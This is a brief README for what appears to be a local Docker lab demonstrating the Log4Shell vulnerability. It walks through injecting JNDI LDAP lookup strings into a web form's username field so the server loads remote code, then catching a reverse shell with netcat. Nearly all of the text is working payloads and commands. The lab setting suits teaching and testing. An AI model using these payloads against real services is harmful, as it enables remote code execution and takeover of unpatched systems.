## Log4shell proof of concept

To start:
```docker-compose up```

Go go localhost:8000 and fill into username:

```${jndi:ldap://exploit:9999/Evil}```


Go back and fill another time:
```${jndi:ldap://reverse-shell:1389/a}```


Start terminal in Ubuntu:
```
docker-compose up -d ubuntu
docker-compose exec ubuntu bash
```

Start terminal in web-server:
```docker-compose exec web-server bash```

Listen for reverse shell:
```nc -lv 9001```

